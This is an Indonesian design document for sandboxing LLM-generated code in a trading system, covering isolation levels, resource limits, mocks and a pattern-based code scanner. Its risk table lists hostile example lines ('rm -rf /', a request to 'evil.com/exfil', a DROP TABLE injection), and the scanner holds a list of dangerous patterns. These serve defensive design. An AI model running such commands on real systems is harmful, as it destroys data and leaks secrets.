# Sandbox Execution untuk Self-Generated Code

> **Dokumen 68** | Pustaka Pengetahuan Pasar Modal Indonesia
>
> **Fokus:** Arsitektur sandbox execution yang aman untuk mengeksekusi, mengetes, dan memvalidasi kode yang di-generate oleh LLM Agent Layer — tanpa risiko merusak sistem production.
>
> **Konteks:** Dokumen 67 mendefinisikan 5-agent layer untuk self-evolution. Builder Agent menghasilkan kode yang harus dieksekusi untuk testing. Kode ini berasal dari LLM dan berpotensi mengandung bug, security vulnerability, atau destructive behavior. Dokumen ini mendefinisikan bagaimana mengeksekusi kode tersebut secara aman.

---

## Daftar Isi

1. [Mengapa Sandbox Wajib](#1-mengapa-sandbox-wajib)
2. [Arsitektur Sandbox](#2-arsitektur-sandbox)
3. [Isolation Levels](#3-isolation-levels)
4. [Resource Limits](#4-resource-limits)
5. [Test Execution Pipeline](#5-test-execution-pipeline)
6. [Security Measures](#6-security-measures)
7. [Database Schema](#7-database-schema)
8. [Implementasi Kode](#8-implementasi-kode)
9. [Checklist Implementasi](#9-checklist-implementasi)

---

## 1. Mengapa Sandbox Wajib

### 1.1 Risiko Kode dari LLM

| Risiko | Contoh | Dampak |
|--------|--------|--------|
| **Infinite loop** | `while True: pass` | CPU 100%, hang |
| **Memory bomb** | `list(range(10**9))` | OOM, crash |
| **File deletion** | `os.system("rm -rf /")` | Data loss permanen |
| **Network access** | `requests.get("evil.com/exfil")` | Data leakage |
| **SQL injection** | `conn.execute(f"DROP TABLE {user_input}")` | Database destruction |
| **Import malicious** | `import subprocess; subprocess.run(...)` | Arbitrary code execution |
| **Side effects** | Modify global state, env vars | Sistem tidak konsisten |
| **Resource exhaustion** | Open 10000 file handles | File descriptor leak |

### 1.2 Prinsip

> **Kode dari LLM tidak dipercaya secara default.** Setiap kode yang di-generate oleh Builder Agent wajib dieksekusi di sandbox terisolasi sebelum diintegrasikan ke production.

---

## 2. Arsitektur Sandbox

### 2.1 Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    BUILDER AGENT                             │
│  code_files: {module.py: "...", test_module.py: "..."}     │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│              SANDBOX EXECUTOR                                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │
│  │  ISOLATE    │─▶│  EXECUTE    │─▶│  COLLECT    │        │
│  │             │  │             │  │             │        │
│  │ - Copy code │  │ - Run pytest│  │ - stdout    │        │
│  │ - Setup env │  │ - Timeout   │  │ - stderr    │        │
│  │ - Install   │  │ - Memory    │  │ - exit code │        │
│  │   deps      │  │   limit     │  │ - coverage  │        │
│  │ - Mock ext  │  │ - CPU limit │  │ - timing    │        │
│  └─────────────┘  └─────────────┘  └──────┬──────┘        │
│                                          │                 │
│                    ┌─────────────┐       │                 │
│                    │  CLEANUP    │◀──────┘                 │
│                    │             │                         │
│                    │ - Kill proc │                         │
│                    │ - Rm temp   │                         │
│                    │ - Free mem  │                         │
│                    └─────────────┘                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────┐
│              VALIDATOR AGENT                                 │
│  results: {all_passed: true, failures: [], coverage: 95%}  │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 Komponen

| Komponen | Fungsi |
|----------|--------|
| **SandboxExecutor** | Orkestrator: isolate → execute → collect → cleanup |
| **EnvironmentManager** | Setup virtualenv, install dependencies, konfigurasi env vars |
| **MockManager** | Mock external API calls, database, network, file system |
| **ResourceMonitor** | Monitor CPU, memory, disk, network selama eksekusi |
| **ResultCollector** | Kumpulkan stdout, stderr, exit code, coverage, timing |
| **CleanupManager** | Kill process, hapus temp files, free resources |

---

## 3. Isolation Levels

### 3.1 Level Definisi

| Level | Metode | Keamanan | Performance | Use Case |
|-------|--------|----------|-------------|----------|
| **L1: Process** | subprocess dengan resource limits | Medium | Cepat | Unit test sederhana |
| **L2: Container** | Docker container dengan seccomp | Tinggi | Sedang | Integration test, code kompleks |
| **L3: VM** | Lightweight VM (Firecracker) | Sangat Tinggi | Lambat | Untrusted code, security audit |
| **L4: E2B** | Cloud sandbox (e2b.dev) | Sangat Tinggi | Sedang | Remote execution, no local setup |

### 3.2 Rekomendasi untuk Trading System

```
Default: L1 (Process) untuk unit test
         L2 (Container) untuk integration test + backtest
         L4 (E2B) untuk untrusted/complex code generation
```

### 3.3 Process-Level Isolation (L1)

```python
# self_evolution/sandbox/process_sandbox.py
import subprocess
import tempfile
import shutil
import time
import os
import signal
import resource

class ProcessSandbox:
    """L1: Process-level isolation dengan resource limits."""

    def __init__(self, workdir: str | None = None, timeout: int = 60,
                 memory_limit_mb: int = 512, cpu_limit_percent: int = 50):
        self.timeout = timeout
        self.memory_limit_mb = memory_limit_mb
        self.cpu_limit_percent = cpu_limit_percent
        self.tempdir = workdir or tempfile.mkdtemp(prefix="sandbox_")
        self.process = None

    def setup(self, code_files: dict[str, str], test_files: dict[str, str],
              requirements: list[str] | None = None) -> str:
        """Setup sandbox environment."""
        # 1. Write code files
        for filepath, content in code_files.items():
            full_path = os.path.join(self.tempdir, filepath)
            os.makedirs(os.path.dirname(full_path), exist_ok=True)
            with open(full_path, "w") as f:
                f.write(content)

        # 2. Write test files
        for filepath, content in test_files.items():
            full_path = os.path.join(self.tempdir, filepath)
            os.makedirs(os.path.dirname(full_path), exist_ok=True)
            with open(full_path, "w") as f:
                f.write(content)

        # 3. Install requirements jika ada
        if requirements:
            self._install_requirements(requirements)

        return self.tempdir

    def run_tests(self) -> dict:
        """Run pytest di sandbox dengan resource limits."""
        try:
            self.process = subprocess.Popen(
                [".venv/bin/pytest", "--tb=short", "--json-report",
                 "--json-report-file=results.json", "-v"],
                cwd=self.tempdir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=self._set_resource_limits,
                env=self._sandbox_env(),
            )

            # Timeout dengan graceful kill
            try:
                stdout, stderr = self.process.communicate(timeout=self.timeout)
                exit_code = self.process.returncode
            except subprocess.TimeoutExpired:
                self._kill_process()
                stdout, stderr = self.process.communicate()
                exit_code = -1

            # Parse results
            results = self._parse_results(stdout, stderr, exit_code)
            return results

        finally:
            self.cleanup()

    def _set_resource_limits(self):
        """Set resource limits untuk child process."""
        # Memory limit
        mem_bytes = self.memory_limit_mb * 1024 * 1024
        try:
            resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))
        except (ValueError, resource.error):
            pass  # RLIMIT_AS tidak selalu supported

        # CPU time limit (detik)
        try:
            resource.setrlimit(resource.RLIMIT_CPU, (self.timeout, self.timeout))
        except (ValueError, resource.error):
            pass

        # File size limit (10 MB)
        try:
            resource.setrlimit(resource.RLIMIT_FSIZE, (10 * 1024 * 1024, 10 * 1024 * 1024))
        except (ValueError, resource.error):
            pass

    def _sandbox_env(self) -> dict:
        """Environment variables yang aman untuk sandbox."""
        env = {
            "PATH": os.environ.get("PATH", ""),
            "HOME": self.tempdir,
            "PYTHONPATH": self.tempdir,
            "SANDBOX_MODE": "1",
            "TRADING_CAPITAL": "0",  # No real capital in sandbox
            "AUTO_TRADE_ENABLED": "false",
            "DB_PATH": os.path.join(self.tempdir, "test.db"),  # Isolated DB
        }
        # Hapus semua sensitive env vars
        for key in ["API_KEY", "BROKER_API_KEY", "TELEGRAM_TOKEN", "FRED_API_KEY", "BPS_API_KEY"]:
            env.pop(key, None)
        return env

    def _kill_process(self):
        """Kill process dan semua children."""
        if self.process:
            try:
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                time.sleep(2)
                os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError):
                pass

    def cleanup(self):
        """Cleanup sandbox."""
        self._kill_process()
        if os.path.exists(self.tempdir):
            shutil.rmtree(self.tempdir, ignore_errors=True)

    def _parse_results(self, stdout, stderr, exit_code) -> dict:
        """Parse test results."""
        results = {
            "exit_code": exit_code,
            "stdout": stdout.decode("utf-8", errors="replace") if stdout else "",
            "stderr": stderr.decode("utf-8", errors="replace") if stderr else "",
            "all_passed": exit_code == 0,
            "failures": [],
            "tests_run": 0,
            "tests_passed": 0,
            "tests_failed": 0,
            "duration_seconds": 0,
        }

        # Parse JSON report jika ada
        report_path = os.path.join(self.tempdir, "results.json")
        if os.path.exists(report_path):
            import json
            with open(report_path) as f:
                report = json.load(f)
                results["tests_run"] = report.get("summary", {}).get("total", 0)
                results["tests_passed"] = report.get("summary", {}).get("passed", 0)
                results["tests_failed"] = report.get("summary", {}).get("failed", 0)
                results["duration_seconds"] = report.get("summary", {}).get("duration", 0)

                for test in report.get("tests", []):
                    if test.get("outcome") == "failed":
                        results["failures"].append({
                            "test": test.get("nodeid", ""),
                            "error": test.get("call", {}).get("longrepr", ""),
                        })

        return results
```

### 3.4 Container-Level Isolation (L2)

```python
# self_evolution/sandbox/container_sandbox.py
import subprocess
import tempfile
import shutil
import os

class ContainerSandbox:
    """L2: Docker container isolation dengan seccomp profile."""

    DOCKER_IMAGE = "trading-sandbox:latest"
    SECCOMP_PROFILE = """{
        "default_action": "SCMP_ACT_ALLOW",
        "syscalls": [
            {"names": ["mount", "umount", "reboot", "swapon", "swapoff"],
             "action": "SCMP_ACT_ERRNO"}
        ]
    }"""

    def __init__(self, timeout: int = 120, memory_limit: str = "1g",
                 cpu_limit: str = "1.0"):
        self.timeout = timeout
        self.memory_limit = memory_limit
        self.cpu_limit = cpu_limit
        self.tempdir = tempfile.mkdtemp(prefix="sandbox_docker_")
        self.container_id = None

    def setup(self, code_files: dict[str, str], test_files: dict[str, str],
              requirements: list[str] | None = None) -> str:
        """Setup container environment."""
        # Write files ke tempdir (akan di-mount ke container)
        for filepath, content in {**code_files, **test_files}.items():
            full_path = os.path.join(self.tempdir, filepath)
            os.makedirs(os.path.dirname(full_path), exist_ok=True)
            with open(full_path, "w") as f:
                f.write(content)

        if requirements:
            with open(os.path.join(self.tempdir, "requirements.txt"), "w") as f:
                f.write("\n".join(requirements))

        # Build container jika belum ada
        self._ensure_image()
        return self.tempdir

    def run_tests(self) -> dict:
        """Run pytest di Docker container."""
        try:
            # Start container
            self.container_id = subprocess.check_output([
                "docker", "run", "-d",
                "--memory", self.memory_limit,
                "--cpus", self.cpu_limit,
                "--security-opt", f"seccomp=/dev/stdin",
                "--read-only",
                "--tmpfs", "/tmp:rw,size=100m",
                "--mount", f"type=bind,source={self.tempdir},target=/workspace,readonly",
                "--workdir", "/workspace",
                "--env", "SANDBOX_MODE=1",
                "--env", "AUTO_TRADE_ENABLED=false",
                "--env", "TRADING_CAPITAL=0",
                "--network", "none",  # No network access
                self.DOCKER_IMAGE,
                "python", "-m", "pytest", "--tb=short", "--json-report",
                "--json-report-file=/tmp/results.json", "-v"
            ], input=self.SECCOMP_PROFILE.encode()).decode().strip()

            # Wait dengan timeout
            try:
                subprocess.run(
                    ["docker", "wait", self.container_id],
                    timeout=self.timeout,
                    check=True,
                    capture_output=True,
                )
            except subprocess.TimeoutExpired:
                subprocess.run(["docker", "kill", self.container_id], capture_output=True)

            # Get logs
            stdout = subprocess.run(
                ["docker", "logs", self.container_id],
                capture_output=True,
            )
            exit_code = int(subprocess.run(
                ["docker", "inspect", "-f", "{{.State.ExitCode}}", self.container_id],
                capture_output=True,
            ).stdout.decode().strip())

            # Copy results
            subprocess.run(
                ["docker", "cp", f"{self.container_id}:/tmp/results.json",
                 os.path.join(self.tempdir, "results.json")],
                capture_output=True,
            )

            return self._parse_results(stdout.stdout, stdout.stderr, exit_code)

        finally:
            self.cleanup()

    def cleanup(self):
        """Remove container dan temp files."""
        if self.container_id:
            subprocess.run(["docker", "rm", "-f", self.container_id], capture_output=True)
        if os.path.exists(self.tempdir):
            shutil.rmtree(self.tempdir, ignore_errors=True)

    def _ensure_image(self):
        """Build sandbox image jika belum ada."""
        result = subprocess.run(
            ["docker", "image", "inspect", self.DOCKER_IMAGE],
            capture_output=True,
        )
        if result.returncode != 0:
            # Build image
            dockerfile = """FROM python:3.11-slim
RUN pip install pytest pytest-json-report pandas numpy scikit-learn pydantic
WORKDIR /workspace
"""
            build_dir = tempfile.mkdtemp()
            with open(os.path.join(build_dir, "Dockerfile"), "w") as f:
                f.write(dockerfile)
            subprocess.run(
                ["docker", "build", "-t", self.DOCKER_IMAGE, build_dir],
                capture_output=True,
            )
            shutil.rmtree(build_dir)
```

---

## 4. Resource Limits

### 4.1 Default Limits

| Resource | L1 (Process) | L2 (Container) | L4 (E2B) |
|----------|--------------|----------------|----------|
| **CPU** | 50% satu core | 1.0 CPU | 2 vCPU |
| **Memory** | 512 MB | 1 GB | 2 GB |
| **Disk** | 10 MB file size | 100 MB tmpfs | 10 GB |
| **Network** | Disabled (mock) | `--network none` | Restricted |
| **Timeout** | 60 detik | 120 detik | 300 detik |
| **Processes** | 1 (no fork) | Limited | Unlimited |
| **File descriptors** | 256 | 1024 | Default |

### 4.2 GPU Access

```python
# GPU access hanya untuk model training/validation di sandbox
# Gunakan cuda:1 (GPU 1, bebas dari display)
GPU_CONFIG = {
    "device": "cuda:1",
    "max_batch_size": 32,  # Lebih kecil dari production (64)
    "max_hidden_dim": 128,  # Lebih kecil dari production (256)
    "max_epochs": 20,      # Lebih kecil dari production (50)
    "memory_fraction": 0.3,  # Max 30% VRAM (1.2 GB dari 4 GB)
}
```

---

## 5. Test Execution Pipeline

### 5.1 Alur Lengkap

```
Builder Agent
    │
    ├── code_files: {module.py, utils.py}
    ├── test_files: {test_module.py}
    └── requirements: [pandas, numpy]
          │
          ▼
    SANDBOX EXECUTOR
          │
          ├── 1. SETUP
          │   ├── Create temp directory
          │   ├── Write code + test files
          │   ├── Install requirements (pip install --no-deps)
          │   ├── Setup mock database (SQLite in-memory)
          │   ├── Mock external APIs (httpx, yfinance, requests)
          │   └── Set env vars (SANDBOX_MODE=1, no real keys)
          │
          ├── 2. EXECUTE
          │   ├── Run: pytest --tb=short --json-report
          │   ├── Monitor: CPU, memory, timeout
          │   └── Kill if: timeout, OOM, segfault
          │
          ├── 3. COLLECT
          │   ├── stdout + stderr
          │   ├── Exit code
          │   ├── Test results (pass/fail per test)
          │   ├── Coverage report
          │   └── Timing per test
          │
          └── 4. CLEANUP
              ├── Kill process/container
              ├── Remove temp files
              └── Free resources
                    │
                    ▼
    VALIDATOR AGENT
        results: {
            all_passed: true/false,
            failures: [...],
            coverage: 95%,
            duration: 12.3s
        }
```

### 5.2 Mock Strategy

| Komponen | Mock Method | Tujuan |
|----------|-------------|--------|
| **Yahoo Finance** | `unittest.mock.patch("yfinance.download")` | Tidak hit real API |
| **IDX scraper** | Mock HTTP response | Tidak hit idx.co.id |
| **Database** | SQLite in-memory atau temp file | Tidak sentuh production DB |
| **Telegram** | Mock `requests.post` | Tidak kirim real notif |
| **Broker API** | Mock `BrokerAdapter.place_order` | Tidak eksekusi real order |
| **File system** | Temp directory, read-only mounts | Tidak modify production files |
| **Environment** | Stripped env vars | Tidak leak API keys |

---

## 6. Security Measures

### 6.1 Code Scanning Sebelum Eksekusi

```python
# self_evolution/sandbox/code_scanner.py
import ast
import re

class CodeScanner:
    """Scan generated code untuk dangerous patterns sebelum eksekusi."""

    DANGEROUS_PATTERNS = [
        # System access
        r"os\.system\s*\(",
        r"subprocess\.(run|call|Popen|check_output)\s*\(",
        r"os\.exec(l|le|vp|vpe)?\s*\(",
        # File operations
        r"shutil\.rmtree\s*\(",
        r"os\.remove\s*\(",
        r"os\.unlink\s*\(",
        # Network
        r"socket\.socket\s*\(",
        r"urllib\.request\.urlopen\s*\(",
        # Eval/exec
        r"\beval\s*\(",
        r"\bexec\s*\(",
        r"__import__\s*\(",
        # Dangerous imports
        r"import\s+(ctypes|cffi|marshal|pickle)",
    ]

    ALLOWED_IMPORTS = {
        "numpy", "pandas", "scipy", "sklearn",
        "pydantic", "datetime", "json", "math",
        "typing", "dataclasses", "enum", "abc",
        "collections", "itertools", "functools",
        "logging", "pathlib", "re",
    ]

    def scan(self, code: str) -> dict:
        """Scan code untuk dangerous patterns."""
        issues = []

        # 1. Regex scan untuk dangerous patterns
        for pattern in self.DANGEROUS_PATTERNS:
            matches = re.findall(pattern, code)
            if matches:
                issues.append(f"Dangerous pattern: {pattern} ({len(matches)} occurrences)")

        # 2. AST analysis untuk import checking
        try:
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        root_module = alias.name.split(".")[0]
                        if root_module not in self.ALLOWED_IMPORTS:
                            issues.append(f"Disallowed import: {alias.name}")
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        root_module = node.module.split(".")[0]
                        if root_module not in self.ALLOWED_IMPORTS:
                            issues.append(f"Disallowed import: from {node.module}")
        except SyntaxError as e:
            issues.append(f"Syntax error: {e}")

        return {
            "passed": len(issues) == 0,
            "issues": issues,
        }
```

### 6.2 Security Checklist

- [ ] Code scanner: AST + regex scan sebelum eksekusi
- [ ] No network access (kecuali untuk mock API yang di-whitelist)
- [ ] No real API keys in sandbox env
- [ ] No real trading capital (TRADING_CAPITAL=0)
- [ ] No real broker connection (AUTO_TRADE_ENABLED=false)
- [ ] Read-only mounts untuk production code
- [ ] Temp directory untuk write operations
- [ ] Resource limits (CPU, memory, timeout)
- [ ] Process isolation (no shared state)
- [ ] Cleanup guaranteed (finally block, signal handler)

---

## 7. Database Schema

```sql
-- Sandbox execution log
CREATE TABLE IF NOT EXISTS sandbox_executions (
    execution_id TEXT PRIMARY KEY,
    trigger_id TEXT,
    sandbox_level TEXT NOT NULL,  -- L1, L2, L4
    code_hash TEXT NOT NULL,      -- SHA256 of code
    status TEXT NOT NULL,          -- setup, running, completed, failed, timeout
    exit_code INTEGER,
    tests_run INTEGER DEFAULT 0,
    tests_passed INTEGER DEFAULT 0,
    tests_failed INTEGER DEFAULT 0,
    coverage_pct REAL,
    duration_seconds REAL,
    stdout TEXT,
    stderr TEXT,
    security_issues TEXT,          -- JSON array
    created_at TEXT NOT NULL,
    completed_at TEXT,
    FOREIGN KEY (trigger_id) REFERENCES evolution_triggers(trigger_id)
);
```

---

## 8. Implementasi Kode

### 8.1 Unified Sandbox Interface

```python
# self_evolution/sandbox/__init__.py
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any

@dataclass
class SandboxResult:
    exit_code: int
    all_passed: bool
    failures: list[dict[str, Any]] = field(default_factory=list)
    tests_run: int = 0
    tests_passed: int = 0
    tests_failed: int = 0
    coverage_pct: float = 0.0
    duration_seconds: float = 0.0
    stdout: str = ""
    stderr: str = ""
    security_issues: list[str] = field(default_factory=list)

class SandboxExecutor(ABC):
    """Abstract sandbox executor — pluggable isolation levels."""

    @abstractmethod
    def setup(self, code_files: dict[str, str], test_files: dict[str, str],
              requirements: list[str] | None = None) -> str:
        pass

    @abstractmethod
    def run_tests(self) -> SandboxResult:
        pass

    @abstractmethod
    def cleanup(self) -> None:
        pass

    def execute(self, code_files: dict[str, str], test_files: dict[str, str],
                requirements: list[str] | None = None) -> SandboxResult:
        """Full pipeline: scan → setup → run → cleanup."""
        # 1. Security scan semua code
        scanner = CodeScanner()
        all_issues = []
        for filepath, code in {**code_files, **test_files}.items():
            scan_result = scanner.scan(code)
            if not scan_result["passed"]:
                all_issues.extend(scan_result["issues"])

        if all_issues:
            return SandboxResult(
                exit_code=-1,
                all_passed=False,
                security_issues=all_issues,
                stderr="Security scan failed: " + "; ".join(all_issues),
            )

        # 2. Setup
        self.setup(code_files, test_files, requirements)

        # 3. Execute
        try:
            result = self.run_tests()
            result.security_issues = all_issues
            return result
        finally:
            # 4. Cleanup (always)
            self.cleanup()
```

### 8.2 Factory

```python
# self_evolution/sandbox/factory.py

def create_sandbox(level: str = "L1", **kwargs) -> SandboxExecutor:
    """Factory untuk membuat sandbox berdasarkan isolation level."""
    if level == "L1":
        return ProcessSandbox(**kwargs)
    elif level == "L2":
        return ContainerSandbox(**kwargs)
    elif level == "L4":
        return E2BSandbox(**kwargs)  # Cloud sandbox
    else:
        raise ValueError(f"Unknown sandbox level: {level}")
```

---

## 9. Checklist Implementasi

### Phase 1: Process Sandbox (L1)

- [ ] Implementasi `ProcessSandbox` dengan subprocess + resource limits
- [ ] Implementasi `CodeScanner` untuk AST + regex scanning
- [ ] Implementasi mock strategy untuk yfinance, database, broker
- [ ] Buat `SandboxResult` dataclass dan JSON report parsing
- [ ] Test: jalankan unit test existing di sandbox, verify pass

### Phase 2: Container Sandbox (L2)

- [ ] Build Docker image `trading-sandbox:latest`
- [ ] Implementasi `ContainerSandbox` dengan seccomp profile
- [ ] Test: network isolation (verify no outbound connection)
- [ ] Test: memory limit (verify OOM kill bekerja)
- [ ] Test: timeout (verify process kill bekerja)

### Phase 3: Integration

- [ ] Integrasikan sandbox dengan Builder Agent (dokumen 67)
- [ ] Integrasikan sandbox dengan Validator Agent (dokumen 67)
- [ ] Tambah `sandbox_executions` table ke database
- [ ] Tambah logging untuk setiap sandbox execution
- [ ] E2E test: generate code → sandbox → validate → integrate

### Phase 4: Hardening

- [ ] Tambah SAST scan (bandit) sebelum eksekusi
- [ ] Tambah dependency vulnerability check (pip-audit)
- [ ] Tambah coverage threshold (min 80% untuk generated code)
- [ ] Tambah timing analysis (flag slow tests > 10s)
- [ ] Tambah memory profiling (flag high memory usage)

---

## Referensi Silang

| Topik | Dokumen Referensi |
|-------|-------------------|
| LLM Agent Layer | `67-llm-agent-layer-self-evolution.md` |
| Knowledge Base | `69-knowledge-base-persistent-memory.md` |
| Hot-swap mechanism | `70-hot-swap-runtime-update.md` |
| Eval-gated promotion | `71-eval-gated-promotion-ab-testing.md` |
| Cybersecurity | `33-cybersecurity-trading-system.md` |
| Docker & deployment | `27-deployment-devops-trading.md` |
| Testing strategy | `19-flow-logic-testing-kpi.md` |

---

## Referensi Eksternal

1. **SelfEvolve** — Process isolation dengan `importlib.reload()` (arxiv.org/abs/2604.16314, 2026)
2. **E2B** — Cloud sandbox untuk code execution (e2b.dev)
3. **Docker seccomp** — Security profiles untuk containers
4. **Python resource module** — RLIMIT_AS, RLIMIT_CPU, RLIMIT_FSIZE
5. **pytest-json-report** — Structured test results untuk parsing

---

> **Catatan:** Sandbox adalah **layer pertama pertahanan** dalam self-evolving system. Tanpa sandbox yang aman, self-generated code dapat merusak sistem production, menghapus data, atau membahayakan keamanan. Sandbox wajib ada sebelum Builder Agent diaktifkan.
